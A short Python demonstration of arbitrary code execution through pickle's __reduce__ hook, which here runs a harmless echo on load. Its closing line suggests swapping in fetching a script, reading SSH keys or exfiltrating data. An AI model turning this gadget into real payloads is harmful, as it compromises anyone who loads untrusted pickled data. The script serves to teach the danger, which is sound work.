import pickle

# A demonstration. This is deliberately harmless, but the mechanism is real.
class Exploit:
    def __reduce__(self):
        # __reduce__ tells pickle HOW to reconstruct the object:
        #   return (callable, args)  ->  on load, pickle calls callable(*args)
        import os
        return (os.system, ('echo "ARBITRARY CODE EXECUTED on unpickle"',))


malicious = pickle.dumps(Exploit())
print(f"the payload is {len(malicious)} bytes of innocent-looking data\n")

print("now loading it:")
pickle.loads(malicious)          # <<< runs os.system(...)

print()
print("No warning. No sandbox. No confirmation. It simply ran.")
print("Replace echo with anything — curl a script, read ~/.ssh, exfiltrate data.")